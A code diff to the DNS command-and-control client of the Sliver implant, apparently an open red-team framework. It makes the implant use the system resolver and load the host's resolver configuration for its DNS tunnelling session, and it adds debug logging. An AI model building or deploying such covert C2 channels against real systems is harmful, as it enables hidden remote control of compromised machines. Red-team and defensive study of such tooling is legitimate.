@@ -68,6 +68,7 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	"github.com/bishopfox/sliver/protobuf/dnspb"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/miekg/dns"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -89,13 +90,7 @@ func DNSStartSession(parent string, retry time.Duration, timeout time.Duration) 
 	log.Printf("DNS client connecting to '%s' (timeout: %s) ...", parent, timeout)
 	// {{end}}
 	client := &SliverDNSClient{
-		resolver: &net.Resolver{
-			PreferGo: true,
-			Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
-				dialer := net.Dialer{Timeout: timeout}
-				return dialer.DialContext(ctx, network, address)
-			},
-		},
+		resolver:      &net.Resolver{PreferGo: false},
 		parent:        "." + strings.TrimPrefix(parent, "."),
 		caseSensitive: false, // Can we use a case sensitive encoding?
 		forceBase32:   false, // Force case insensitive encoding
@@ -116,7 +111,8 @@ func DNSStartSession(parent string, retry time.Duration, timeout time.Duration) 
 
 // SliverDNSClient - The DNS client context
 type SliverDNSClient struct {
-	resolver *net.Resolver
+	resolver   *net.Resolver
+	resolvConf *dns.ClientConfig
 
 	parent        string
 	retry         time.Duration
@@ -133,6 +129,16 @@ type SliverDNSClient struct {
 
 // SessionInit - Initialize DNS session
 func (s *SliverDNSClient) SessionInit() error {
+
+	err := s.loadResolvConf()
+	if err != nil {
+		return err
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("[dns] Found resolvers: %v", s.resolvConf.Servers)
+	// {{end}}
+
 	otpMsg, err := s.otpMsg()
 	if err != nil {
 		return err
@@ -161,6 +167,12 @@ func (s *SliverDNSClient) SessionInit() error {
 	// {{end}}
 
 	return nil
+}
+
+func (s *SliverDNSClient) loadResolvConf() error {
+	var err error
+	s.resolvConf, err = dnsClientConfig()
+	return err
 }
 
 func (s *SliverDNSClient) joinSubdata(subdata string) (string, error) {
@@ -246,6 +258,7 @@ func (s *SliverDNSClient) a(domain string) ([][]byte, error) {
 	// {{if .Config.Debug}}
 	started := time.Now()
 	log.Printf("[dns] a lookup -> %s", domain)
+	log.Printf("[dns] resolver: %v", s.resolver)
 	// {{end}}
 
 	var ips []net.IPAddr
